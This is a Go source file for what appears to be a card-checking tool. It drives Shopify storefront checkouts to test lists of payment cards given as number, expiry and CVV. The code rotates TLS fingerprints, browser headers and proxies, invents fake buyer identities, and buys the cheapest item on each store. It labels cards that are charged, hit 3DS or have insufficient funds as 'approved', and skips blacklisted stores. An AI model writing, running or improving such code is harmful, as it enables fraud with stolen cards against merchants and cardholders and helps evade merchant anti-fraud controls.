package main

import (
	"errors"
	"fmt"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
	"time"

	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
)

// addBlacklist is a no-op for the site checker (no global blacklist needed).
// Kept so runCheckoutForCard compiles unchanged from bo-main.
func addBlacklist(string) {}

func randSleep(minSec, maxSec float64) {
	d := minSec + rand.Float64()*(maxSec-minSec)
	time.Sleep(time.Duration(d * float64(time.Second)))
}

var tlsProfiles = []profiles.ClientProfile{
	profiles.Chrome_146,
	profiles.Chrome_144,
	profiles.Chrome_133,
	profiles.Chrome_131,
	profiles.Chrome_124,
	profiles.Chrome_120,
	profiles.Chrome_117,
}

func randomTLSProfile() profiles.ClientProfile {
	return tlsProfiles[rand.Intn(len(tlsProfiles))]
}

var chromeVersions = []int{146, 144, 133, 131, 124, 120, 117}

func randomChromeUA() string {
	v := chromeVersions[rand.Intn(len(chromeVersions))]
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", v)
}

func randomSecChUA() string {
	v := chromeVersions[rand.Intn(len(chromeVersions))]
	return fmt.Sprintf(`"Chromium";v="%d", "Not-A.Brand";v="24", "Microsoft Edge";v="%d"`, v, v)
}

func sniffPageType(s string) string {
	if s == "" {
		return "EMPTY_BODY"
	}
	lower := strings.ToLower(s)
	switch {
	case strings.Contains(lower, "cf-challenge") ||
		strings.Contains(lower, "challenge-platform") ||
		strings.Contains(lower, "just a moment..."):
		return "CF_CHALLENGE"
	case strings.Contains(lower, `enter using password`) ||
		strings.Contains(lower, `enter store using password`) ||
		strings.Contains(lower, `id="password"`) ||
		strings.Contains(lower, `/password`):
		return "PASSWORD_PAGE"
	case strings.Contains(lower, `your cart is empty`) ||
		strings.Contains(lower, `cart is empty`) ||
		strings.Contains(lower, `empty cart`):
		return "EMPTY_CART"
	case strings.Contains(lower, `page not found`) || strings.Contains(lower, `404 not found`):
		return "NOT_FOUND"
	case strings.Contains(lower, `access denied`) || strings.Contains(lower, "you don't have permission"):
		return "ACCESS_DENIED"
	case strings.Contains(lower, "shopify-checkout"):
		return "CHECKOUT_NO_SPA"
	}
	return "UNKNOWN"
}

type BoCheckStatus int

const (
	BoCharged BoCheckStatus = iota
	BoApproved
	BoDeclined
	BoError
)

type BoCheckResult struct {
	Card       string
	Status     BoCheckStatus
	StatusCode string
	Amount     string
	Currency   string
	SiteName   string
	ShopURL    string
	Gateway    string
	Error      error
	Retryable  bool
}

var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"`)
var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled|SubmitRejected)"`)
var submitErrorCodeRe = regexp.MustCompile(`"code"\s*:\s*"([A-Z][A-Z0-9_]*)"`)
var errMissingReceiptID = errors.New("submit response missing receiptId")
var errStoreIncompatible = errors.New("store incompatible")
var errDeadStore = errors.New("dead store")

func extractSubmitErrorCodes(body string) []string {
	codes := submitErrorCodeRe.FindAllStringSubmatch(body, -1)
	seen := make(map[string]struct{}, len(codes))
	out := make([]string, 0, len(codes))
	for _, m := range codes {
		if len(m) > 1 {
			if _, ok := seen[m[1]]; ok {
				continue
			}
			seen[m[1]] = struct{}{}
			out = append(out, m[1])
		}
	}
	return out
}

func containsCode(codes []string, target string) bool {
	for _, c := range codes {
		if c == target {
			return true
		}
	}
	return false
}

func generateAttemptToken(checkoutToken string) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return checkoutToken + "-" + string(b)
}

func generatePageID() string {
	b := make([]byte, 16)
	for i := range b {
		b[i] = byte(rand.Intn(256))
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

var firstNames = []string{"james", "john", "robert", "michael", "david", "william", "richard", "joseph", "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth", "barbara", "susan", "jessica", "sarah", "karen", "nancy", "lisa", "betty", "helen", "sandra", "donald", "carol", "ruth", "sharon", "michelle", "laura", "sarah", "kimberly", "deborah", "dorothy"}
var lastNames = []string{"smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis", "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson", "martin", "lee", "perez", "thompson", "white", "harris", "clark", "lewis", "robinson", "walker", "young", "allen", "king", "wright", "scott"}

func randomFirstName() string {
	return firstNames[rand.Intn(len(firstNames))]
}

func randomLastName() string {
	return lastNames[rand.Intn(len(lastNames))]
}

var emailDomains = []string{"@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com", "@icloud.com", "@aol.com", "@protonmail.com", "@mail.com"}

func randomEmail(first, last string) string {
	domain := emailDomains[rand.Intn(len(emailDomains))]
	return fmt.Sprintf("%s%s%d%s", first, last, 1000+rand.Intn(9000), domain)
}

func formatCardNumber(cc string) string {
	var parts []string
	for i := 0; i < len(cc); i += 4 {
		end := i + 4
		if end > len(cc) {
			end = len(cc)
		}
		parts = append(parts, cc[i:end])
	}
	return strings.Join(parts, " ")
}

func createNoProxyClient() (tls_client.HttpClient, error) {
	jar := tls_client.NewCookieJar()
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(),
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(randomTLSProfile()),
		tls_client.WithCookieJar(jar),
	)
}

func parseCardEntry(cardEntry, filePath string) (string, int, int, string, error) {
	cardParts := strings.Split(strings.TrimSpace(cardEntry), "|")
	if len(cardParts) != 4 {
		return "", 0, 0, "", fmt.Errorf("invalid card format in %s: %s", filePath, cardEntry)
	}

	cardMonth, err := strconv.Atoi(cardParts[1])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card month in %s: %w", filePath, err)
	}
	cardYear, err := strconv.Atoi(cardParts[2])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card year in %s: %w", filePath, err)
	}

	return cardParts[0], cardMonth, cardYear, cardParts[3], nil
}

func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*BoCheckResult, error) {
	currency := "USD"
	country := "US"
	siteName := strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")

	result := &BoCheckResult{
		Card:     cardEntry,
		ShopURL:  shopURL,
		SiteName: siteName,
		Currency: currency,
	}

	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry, path)
	if err != nil {
		result.Status = BoError
		result.Error = err
		return result, err
	}

	jar := tls_client.NewCookieJar()
	clOptions := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(randomTLSProfile()),
		tls_client.WithCookieJar(jar),
	}
	if proxyURL != "" {
		clOptions = append(clOptions, tls_client.WithProxyUrl(proxyURL))
	}
	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), clOptions...)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("failed to create tls client: %w", err)
		return result, result.Error
	}

	stepStart := func(step, detail string) {}

	stepStart("0·products", shopURL)
	randSleep(0.5, 1.5)
	title, _, variantID, price, err := findCheapestProduct(client, shopURL)
	_ = title
	if err != nil {
		result.Status = BoError
		result.Retryable = true
		if errors.Is(err, errDeadStore) {
			// Dead/inactive store: blacklist it so it's never tried again.
			// Keep Retryable=true so this card immediately moves to another site.
			addBlacklist(shopURL)
			result.Error = fmt.Errorf("Step 0 dead store, blacklisted: %w", err)
		} else {
			result.Error = fmt.Errorf("Step 0 failed: %w", err)
		}
		return result, result.Error
	}

	stepStart("1·cart+checkout", shopURL+" variant="+variantID)
	randSleep(1.0, 2.5)
	var effectiveShopURL string
	effectiveShopURL, checkoutURL, checkoutToken, sessionToken, checkoutHTML, err := addToCartAndCheckout(client, shopURL, variantID)
	if err != nil {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 1 failed: %w", err)
		return result, result.Error
	}
	// Use the effective (possibly custom-domain) shop URL for all subsequent requests
	// so that Origin/Referer/GraphQL endpoints match the domain where the checkout loaded.
	if effectiveShopURL != shopURL {
		shopURL = effectiveShopURL
		siteName = strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")
		result.SiteName = siteName
	}
	stableID := extractStableID(checkoutHTML)
	buildID := extractCommitSha(checkoutHTML)
	sourceToken := extractSourceToken(checkoutHTML)

	if htmlCurrency := extractCurrencyFromHTML(checkoutHTML); htmlCurrency != "" {
		currency = htmlCurrency
	}
	if htmlPrice := extractCheckoutPriceFromHTML(checkoutHTML); htmlPrice != "" {
		price = htmlPrice
	}
	if stableID == "" || buildID == "" || sourceToken == "" {
		saveDebugResponse("checkout_html_step1", checkoutHTML)
		pageType := sniffPageType(checkoutHTML)
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 1 — checkout page reported: %s (len=%d, landed=%s)", pageType, len(checkoutHTML), checkoutURL)
		return result, result.Error
	}

	patID := extractPrivateAccessTokenID(checkoutHTML)
	if patID == "" {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: could not extract private_access_token id")
		return result, result.Error
	}
	stepStart("2·priv-access", patID)
	_, err = fetchPrivateAccessToken(client, shopURL, checkoutURL, patID)
	if err != nil {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: %w", err)
		return result, result.Error
	}

	actionsURL := extractActionsJSURL(checkoutHTML, shopURL)
	if actionsURL == "" {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: could not find actions JS URL")
		return result, result.Error
	}
	stepStart("3·actions-js", actionsURL)
	jsBody, err := fetchActionsJS(client, actionsURL, shopURL)
	if err != nil {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: %w", err)
		return result, result.Error
	}
	proposalID := extractProposalID(jsBody)
	submitID := extractSubmitForCompletionID(jsBody)
	if proposalID == "" || submitID == "" {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: missing Proposal or Submit ID")
		return result, result.Error
	}

	pollForReceiptID := extractPollForReceiptID(jsBody)
	if pollForReceiptID == "" {
		processingURLs := extractProcessingJSURLs(checkoutHTML, shopURL)
		tried := 0
		for _, jsURL := range processingURLs {
			pjs, errPJS := fetchActionsJS(client, jsURL, shopURL)
			if errPJS != nil {
				continue
			}
			tried++
			if id := extractPollForReceiptID(pjs); id != "" {
				pollForReceiptID = id
				break
			}
		}
		if pollForReceiptID == "" {
			saveDebugResponse("checkout_html_no_pollid", checkoutHTML)
			result.Status = BoError
			result.Retryable = true
			result.Error = fmt.Errorf("%w: Step 3 failed: missing PollForReceipt ID (tried %d/%d bundles)", errStoreIncompatible, tried, len(processingURLs))
			return result, result.Error
		}
	}

	firstName := randomFirstName()
	lastName := randomLastName()
	email := randomEmail(firstName, lastName)
	defaultAddr := addressForCountry("US")
	phone := defaultAddr.Phone

	stepStart("4·proposal1", "queue=null")
	randSleep(1.5, 2.5)
	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country, email, phone, proxyURL)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 4 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal", proposalBody)

	if cur := extractSellerCurrency(proposalBody); cur != "" && cur != currency {
		currency = cur
	}
	if ctr := extractSellerCountry(proposalBody); ctr != "" && ctr != country {
		country = ctr
	}
	result.Currency = currency
	if currency == "USD" {
		if sellerPrice := extractSellerMerchandisePrice(proposalBody); sellerPrice != "" && sellerPrice != price {
			price = sellerPrice
		}
	}

	queueToken := extractQueueToken(proposalBody)
	if queueToken == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 4 failed: could not extract queueToken")
		return result, result.Error
	}

	deliveryHandle := extractDeliveryHandle(proposalBody)
	paymentMethodIdentifier := extractPaymentMethodID(proposalBody)
	if paymentMethodIdentifier == "" {
		paymentMethodIdentifier = "credit_card"
	}

	stepStart("5·proposal2", "handle="+deliveryHandle)
	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country, deliveryHandle, phone, proxyURL)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 5 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal2", proposal2Body)
	queueToken2 := extractQueueToken(proposal2Body)
	if queueToken2 == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 5 failed: could not extract queueToken")
		return result, result.Error
	}

	addr := addressForCountry(country)
	addr.FirstName = firstName
	addr.LastName = lastName
	phone = addr.Phone
	stepStart("6·proposal3", "addr country="+country)
	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country, deliveryHandle, proxyURL)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 6 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal3", proposal3Body)
	queueToken3 := extractQueueToken(proposal3Body)
	if queueToken3 == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 6 failed: could not extract queueToken")
		return result, result.Error
	}

	randSleep(0.2, 0.5)
	stepStart("7·proposal4", "")
	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country, deliveryHandle, proxyURL)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 7 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal4", proposal4Body)
	queueToken4 := extractQueueToken(proposal4Body)
	if queueToken4 == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 7 failed: could not extract queueToken")
		return result, result.Error
	}

	randSleep(0.2, 0.5)
	stepStart("8·proposal5", "")
	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country, deliveryHandle, proxyURL)
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 8 failed: %w", err)
		return result, result.Error
	}
	_ = proposal5Status
	saveDebugResponse("proposal5", proposal5Body)

	identSig := extractIdentificationSignature(checkoutHTML)
	if identSig == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 9 failed: could not extract identification signature")
		return result, result.Error
	}

	stepStart("9·pci-session", "")
	randSleep(1.2, 2.0)
	pciStatus, pciBody, err := sendPCISession(identSig, cardNumber, fmt.Sprintf("%s %s", addr.FirstName, addr.LastName), cardMonth, cardYear, cardCVV, siteName, proxyURL)
	_ = pciStatus
	if err != nil {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 9 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("pci_session", pciBody)

	pciSessionID := extractPCISessionID(pciBody)
	if pciSessionID == "" {
		result.Status = BoError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID (shop=%s)", shopURL)
		return result, result.Error
	}

	queueToken5 := extractQueueToken(proposal5Body)
	if queueToken5 == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
		return result, result.Error
	}
	deliveryHandle = extractDeliveryHandle(proposal5Body)
	if deliveryHandle == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	signedHandles := extractSignedHandles(proposal5Body)
	if len(signedHandles) == 0 {
		result.Status = BoError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract signedHandles", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	shippingAmount := extractShippingAmount(proposal5Body)
	if shippingAmount == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract shipping amount", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	totalAmount := extractRunningTotal(proposal5Body)
	if totalAmount == "" {
		totalAmount = extractCheckoutTotal(proposal5Body)
	}
	if totalAmount == "" {
		totalAmount = extractSellerTotal(proposal5Body)
	}
	if totalAmount == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 10 failed: could not extract total amount")
		return result, result.Error
	}
	result.Amount = totalAmount

	attemptToken := generateAttemptToken(checkoutToken)
	stepStart("10·submit", "total="+totalAmount)
	randSleep(2.0, 3.5)
	submitStatus, submitBody, err := sendSubmitForCompletion(
		client, shopURL, checkoutURL, checkoutToken, sessionToken,
		stableID, variantID, price,
		submitID, buildID, sourceToken, queueToken5, email,
		addr,
		deliveryHandle, shippingAmount, totalAmount,
		pciSessionID, attemptToken, currency, country,
		signedHandles,
		paymentMethodIdentifier, cardNumber, proxyURL,
	)
	_ = submitStatus
	if err != nil {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 10 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("submit", submitBody)
	checkSubmitErrors(submitStatus, submitBody)

	// Dynamic retry: if the shop requires address line 2, populate it and resubmit.
	if addr.Address2 == "" && strings.Contains(submitBody, "DELIVERY_ADDRESS2_REQUIRED") {
		addr.Address2 = randomAddress2()
		fmt.Printf("[SUBMIT] DELIVERY_ADDRESS2_REQUIRED — retrying with address2=%q\n", addr.Address2)
		attemptToken = generateAttemptToken(checkoutToken)
		randSleep(1.0, 2.0)
		submitStatus, submitBody, err = sendSubmitForCompletion(
			client, shopURL, checkoutURL, checkoutToken, sessionToken,
			stableID, variantID, price,
			submitID, buildID, sourceToken, queueToken5, email,
			addr,
			deliveryHandle, shippingAmount, totalAmount,
			pciSessionID, attemptToken, currency, country,
			signedHandles,
			paymentMethodIdentifier, cardNumber, proxyURL,
		)
		if err != nil {
			result.Status = BoError
			result.Error = fmt.Errorf("Step 10 retry failed: %w", err)
			return result, result.Error
		}
		saveDebugResponse("submit-retry", submitBody)
		checkSubmitErrors(submitStatus, submitBody)
	}

	if mt := submitTypeRe.FindStringSubmatch(submitBody); len(mt) > 1 && mt[1] == "SubmitRejected" {
		codes := extractSubmitErrorCodes(submitBody)
		if len(codes) > 0 {
			allCodes := strings.Join(codes, ", ")
			cardBrandNotSupported := containsCode(codes, "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED")
			cardInvalid := containsCode(codes, "PAYMENTS_CREDIT_CARD_NUMBER_INVALID") ||
				containsCode(codes, "PAYMENTS_CREDIT_CARD_EXPIRATION_DATE_INVALID") ||
				containsCode(codes, "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE")

			if cardInvalid {
				primary := codes[0]
				result.Status = BoDeclined
				result.StatusCode = primary
				result.Error = fmt.Errorf("declined: %s (codes: %s)", primary, allCodes)
				result.Retryable = false
				return result, result.Error
			}

			if cardBrandNotSupported {
				result.Status = BoError
				result.StatusCode = "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED"
				result.Error = fmt.Errorf("rejected: %s (codes: %s)", "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED", allCodes)
				result.Retryable = true
				return result, result.Error
			}

			primary := codes[0]
			result.Status = BoError
			result.StatusCode = primary
			result.Error = fmt.Errorf("Step 10 rejected: %s (codes: %s)", primary, allCodes)
			result.Retryable = true
			return result, result.Error
		}
		result.Status = BoError
		result.Error = fmt.Errorf("%w: Step 10 SubmitRejected with no error codes (shop=%s)", errMissingReceiptID, shopURL)
		result.Retryable = true
		return result, result.Error
	}

	receiptID := extractReceiptID(submitBody)
	if receiptID == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId (shop=%s)", errMissingReceiptID, shopURL)
		result.Retryable = true
		return result, result.Error
	}
	receiptSessionToken := extractReceiptSessionToken(submitBody)
	if receiptSessionToken == "" {
		result.Status = BoError
		result.Error = fmt.Errorf("Step 10 failed: could not extract sessionToken")
		return result, result.Error
	}

	pollDelayRe := regexp.MustCompile(`"pollDelay"\s*:\s*(\d+)`)
	typeNameRe := regexp.MustCompile(`"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"`)
	for pollNum := 1; ; pollNum++ {
		stepStart("11·poll", fmt.Sprintf("num=%d", pollNum))
		_, pollBody, err := sendPollForReceipt(
			client, shopURL, checkoutURL, checkoutToken, sessionToken,
			buildID, sourceToken,
			pollForReceiptID, receiptID, receiptSessionToken,
			proxyURL,
		)
		if err != nil {
			result.Status = BoError
			result.Error = fmt.Errorf("poll %d failed: %w", pollNum, err)
			return result, result.Error
		}

		receiptType := ""
		if m := typeNameRe.FindStringSubmatch(pollBody); len(m) > 1 {
			receiptType = m[1]
		}
		statusCode := extractReceiptStatusCode(pollBody, receiptType)
		result.StatusCode = statusCode

		saveDebugResponse(fmt.Sprintf("poll%d", pollNum), pollBody)

		// Detect Cloudflare challenge pages — these are HTML, not JSON, and will never resolve.
		// Bail immediately instead of wasting 6 polls × 3s sleeping on a blocked shop.
		if strings.Contains(pollBody, "_cf_chl_opt") || strings.Contains(pollBody, "challenge-error-text") {
			result.Status = BoError
			result.StatusCode = "CLOUDFLARE_BLOCKED"
			result.Retryable = true
			result.Error = fmt.Errorf("%w: poll %d: Cloudflare challenge page (shop=%s)", errStoreIncompatible, pollNum, shopURL)
			return result, result.Error
		}

		if receiptType == "" && strings.Contains(pollBody, `"errors"`) && strings.Contains(pollBody, "undefinedField") {
			result.Status = BoError
			result.StatusCode = "SCHEMA_MISMATCH"
			result.Retryable = true
			result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
			return result, result.Error
		}

		if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
			result.Status = BoCharged
			result.StatusCode = "ORDER_PLACED"
			return result, nil
		}
		if receiptType == "ActionRequiredReceipt" {
			result.Status = BoApproved
			result.StatusCode = "3DS_REQUIRED"
			return result, nil
		}
		// 3DS fallback detection (string matching)
		if strings.Contains(pollBody, "CompletePaymentChallenge") || strings.Contains(pollBody, "/stripe/authentications/") {
			result.Status = BoApproved
			result.StatusCode = "3DS_REQUIRED"
			return result, nil
		}
		if receiptType == "FailedReceipt" {
			errorCode := ""
			errorRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
			if m := errorRe.FindStringSubmatch(pollBody); len(m) > 1 {
				errorCode = m[1]
			}
			if errorCode == "" {
				errorCode = "FAILED"
			}

			switch errorCode {
			case "INSUFFICIENT_FUNDS":
				result.Status = BoApproved
				result.StatusCode = errorCode
				return result, nil
			case "CAPTCHA_REQUIRED":
				result.Status = BoDeclined
				result.StatusCode = "CARD_DECLINED"
				result.Error = fmt.Errorf("declined: CARD_DECLINED")
				return result, result.Error
			case "GENERIC_ERROR":
				result.Status = BoDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			default:
				if strings.Contains(pollBody, "InventoryReservationFailure") {
					result.Status = BoError
					result.StatusCode = "INVENTORY_FAILURE"
					result.Retryable = true
					result.Error = fmt.Errorf("retryable: inventory reservation failure")
					return result, result.Error
				}
				result.Status = BoDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			}
		}

		delay := 2000
		if m := pollDelayRe.FindStringSubmatch(pollBody); len(m) > 1 {
			if d, err := strconv.Atoi(m[1]); err == nil && d > 0 {
				delay = d
			}
		}
		if delay > 8000 {
			delay = 8000
		}
		time.Sleep(time.Duration(delay) * time.Millisecond)

		if pollNum >= 10 {
			result.Status = BoError
			result.Error = fmt.Errorf("exceeded 10 poll attempts")
			return result, result.Error
		}
	}
}
